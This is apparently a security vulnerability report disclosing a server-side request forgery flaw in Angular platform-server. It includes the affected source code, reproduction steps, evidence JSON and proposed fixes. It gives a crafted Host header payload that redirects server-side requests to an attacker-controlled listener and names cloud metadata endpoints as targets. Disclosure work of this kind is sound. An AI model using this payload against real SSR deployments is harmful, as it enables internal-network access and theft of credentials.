# SSRF in Angular platform-server SSR through Host-derived render URL

## Product

Angular

## Component

`@angular/platform-server`

## Tested version

Local Angular framework checkout:

```text
/Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/targets/angular
```

The tested integration app is:

```text
integration/platform-server/projects/standalone
```

The same affected API shape also exists in released `@angular/platform-server`
applications that call `renderApplication()` or `renderModule()` with a URL
derived from the incoming request.

## Vulnerability type

CWE-918: Server-Side Request Forgery

## Suggested severity

High

Recommended CVSS v4.0:

```text
CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:L/VA:N/SC:L/SI:L/SA:N
```

Rationale:

- Network attacker, no privileges, no user interaction.
- The application must use the affected SSR pattern and perform a server-side
  relative `HttpClient` request.
- The vulnerable server can be made to issue outbound HTTP requests to an
  attacker-chosen host and port.
- The demonstrated impact includes attacker-controlled response data being
  inserted into the SSR HTML.
- Confidentiality can become high when the SSR process can reach internal
  services or cloud metadata endpoints.

Conservative CVSS v3.1:

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
```

## Summary

Angular `platform-server` resolves server-side relative `HttpClient` requests
against the current `PlatformLocation` origin. In SSR applications that build
the render URL from an untrusted `Host` header, an attacker can control that
origin. Relative server-side `HttpClient` requests are then rewritten to an
attacker-controlled host and port.

The issue was reproduced end-to-end in Angular's own compiled
`integration/platform-server` standalone SSR application. The app builds the
render URL as:

```ts
url: `${protocol}://${headers.host}${originalUrl}`,
```

and a lazy-loaded component performs:

```ts
this.httpClient.get<any>('/api-2')
```

When the request contains:

```http
Host: victim.test@127.0.0.1:<attacker-port>
```

the server-side relative request is sent to:

```text
http://127.0.0.1:<attacker-port>/api-2
```

The attacker listener's response is then rendered into the SSR HTML.

## Affected code

`packages/platform-server/src/location.ts`

```ts
function parseUrl(urlStr: string, origin: string): URL {
  const urlToParse = urlStr.length === 0 || urlStr[0] === '/' ? origin + urlStr : urlStr;
  return new URL(urlToParse);
}
```

The parsed `INITIAL_CONFIG.url` becomes the server `PlatformLocation` state:

```ts
const {protocol, hostname, port, pathname, search, hash, href} = parseUrl(
  config.url,
  this._doc.location.origin,
);
```

`packages/platform-server/src/http.ts`

```ts
const platformLocation = inject(PlatformLocation);
const {href, protocol, hostname, port} = platformLocation;

let urlPrefix = `${protocol}//${hostname}`;
if (port) {
  urlPrefix += `:${port}`;
}

const baseHref = platformLocation.getBaseHrefFromDOM() || href;
const baseUrl = new URL(baseHref, urlPrefix);
const newUrl = new URL(request.url, baseUrl).toString();

return next(request.clone({url: newUrl}));
```

The interceptor rewrites every server-side relative request using the
`PlatformLocation` origin. If that origin came from an untrusted `Host` header,
the outbound request target is attacker-controlled.

Angular integration app:

`integration/platform-server/projects/standalone/server.ts`

```ts
const {protocol, originalUrl, baseUrl, headers} = req;

renderApplication(bootstrap, {
  document: indexHtml,
  url: `${protocol}://${headers.host}${originalUrl}`,
  platformProviders: [{provide: APP_BASE_HREF, useValue: baseUrl}],
})
```

`integration/platform-server/projects/standalone/src/app/http-transferstate-lazy/http-transfer-state.component.ts`

```ts
ngOnInit(): void {
  this.httpClient.get<any>('/api-2').subscribe((response) => {
    this.responseTwo = response.data;
  });
}
```

## Impact

A remote attacker can make the SSR process send server-side HTTP requests to an
attacker-chosen origin when all of the following are true:

- The app uses `@angular/platform-server` SSR through `renderApplication()` or
  `renderModule()`.
- The app builds the render URL from request data such as `headers.host`.
- The app performs server-side `HttpClient` requests with relative URLs during
  rendering.
- The deployment does not reject or normalize the attacker-controlled `Host`
  header before it reaches the Node/Express server.

Confirmed impact:

- The SSR server makes an outbound request to an attacker-controlled listener.
- The attacker listener controls the response body.
- The response body is rendered into the server-generated HTML.

Likely deployment impact:

- SSRF to internal services reachable from the SSR process.
- Access to metadata services such as `169.254.169.254` if reachable.
- Response poisoning in SSR output.
- Exfiltration of server-side authorization headers if the application has
  `HttpClient` interceptors that attach credentials to relative requests.

The PoC does not rely on a unit test. It uses a compiled Angular SSR app and a
real TCP listener.

## Steps to reproduce

### 1. Build the Angular integration app

From the Angular checkout:

```bash
cd /Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/targets/angular
PNPM_HOME=/tmp/vulnhunter-pnpm COREPACK_HOME=/tmp/vulnhunter-corepack pnpm --dir integration/platform-server build:standalone
```

The tested server artifact is created at:

```text
integration/platform-server/dist/standalone/server/server.mjs
```

### 2. Run the PoC

From the research workspace:

```bash
cd /Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter
node bugs/angular/a1-ssr-url-origin-reconstruction/poc/a1_macos_compiled_standalone_app_probe.mjs
```

The PoC starts:

- the compiled Angular SSR server on port `4206`;
- an attacker HTTP listener on a random local port;
- a raw HTTP request to the Angular SSR server with a crafted `Host` header.

The crafted request shape is:

```http
GET /http-transferstate-lazy HTTP/1.1
Host: victim.test@127.0.0.1:<attacker-port>
Connection: close
```

### 3. Expected result

The attacker listener receives the server-side request:

```json
{
  "method": "GET",
  "url": "/api-2",
  "host": "127.0.0.1:<attacker-port>"
}
```

The SSR response contains the attacker-controlled body returned by the listener.

## Evidence

Saved output:

```text
bugs/angular/a1-ssr-url-origin-reconstruction/evidence/2026-04-29-macos-compiled-standalone-app-probe.json
```

Relevant excerpt:

```json
{
  "scenario": "compiled Angular integration standalone SSR app on macOS",
  "craftedRequest": {
    "requestTarget": "/http-transferstate-lazy",
    "hostHeader": "victim.test@127.0.0.1:55846"
  },
  "responseHead": "HTTP/1.1 200 OK\r\nX-Powered-By: Express\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: 1138\r\nETag: W/\"472-etCC2VtKpwptD58Pch06aXE4+hc\"\r\nDate: Wed, 29 Apr 2026 08:59:02 GMT\r\nConnection: close",
  "responseContainsAttackerData": true,
  "attackerHits": [
    {
      "method": "GET",
      "url": "/api-2",
      "host": "127.0.0.1:55846",
      "authorization": null,
      "bodyLength": 0
    }
  ]
}
```

Additional reduced evidence:

```text
bugs/angular/a1-ssr-url-origin-reconstruction/evidence/2026-04-29-platform-server-real-network-reduction.json
bugs/angular/a1-ssr-url-origin-reconstruction/evidence/2026-04-29-node-raw-request-to-platform-server-rewrite.json
bugs/angular/a1-ssr-url-origin-reconstruction/evidence/2026-04-29-express-legacy-host-userinfo-rewrite.json
```

## Security boundary

The request crosses from an external HTTP client into Angular SSR state. The
untrusted `Host` value becomes `INITIAL_CONFIG.url`, then `ServerPlatformLocation`
state, then the base origin used for server-side relative `HttpClient` requests.

The framework contract that breaks is that relative server-side `HttpClient`
requests should resolve to the application origin, not to an origin selected by
an external HTTP client.

## Limitations

This report does not claim that every Angular SSR deployment is affected.

Observed limitations:

- Current `AngularNodeAppEngine` and `AngularAppEngine` paths in `@angular/ssr`
  have host validation for the variants tested.
- Deployments that reject untrusted `Host` headers at a proxy layer may block
  this payload before it reaches Angular SSR.
- A concrete XSS was not demonstrated. The PoC demonstrates SSRF and SSR output
  poisoning with interpolated text.

The affected surface is direct or legacy `@angular/platform-server` SSR usage
and the Angular-owned Express integration pattern shown above.

## Suggested fix

Do not use the raw `PlatformLocation` origin from `INITIAL_CONFIG.url` as the
trust source for server-side relative `HttpClient` requests unless the origin
has been explicitly validated.

Possible fixes:

1. In `platform-server`, treat the request URL passed to rendering as
   path-only unless the application explicitly opts into absolute origins.
2. Add a server-side allowlist for `PlatformLocation` origin before rewriting
   relative `HttpClient` requests.
3. Document that SSR integrations must validate `Host` and must not build the
   render URL directly from `headers.host`.
4. Update Angular's `integration/platform-server` Express sample to derive the
   render URL from a trusted configured origin, or validate `headers.host`
   before use.

## Files attached

PoC:

```text
bugs/angular/a1-ssr-url-origin-reconstruction/poc/a1_macos_compiled_standalone_app_probe.mjs
bugs/angular/a1-ssr-url-origin-reconstruction/poc/a1_express_legacy_host_userinfo_rewrite.mjs
bugs/angular/a1-ssr-url-origin-reconstruction/poc/a1_platform_server_real_network_reduction.mjs
bugs/angular/a1-ssr-url-origin-reconstruction/poc/a1_node_raw_request_to_platform_server_rewrite.mjs
```

Evidence:

```text
bugs/angular/a1-ssr-url-origin-reconstruction/evidence/2026-04-29-macos-compiled-standalone-app-probe.json
bugs/angular/a1-ssr-url-origin-reconstruction/evidence/2026-04-29-express-legacy-host-userinfo-rewrite.json
bugs/angular/a1-ssr-url-origin-reconstruction/evidence/2026-04-29-platform-server-real-network-reduction.json
bugs/angular/a1-ssr-url-origin-reconstruction/evidence/2026-04-29-node-raw-request-to-platform-server-rewrite.json
```
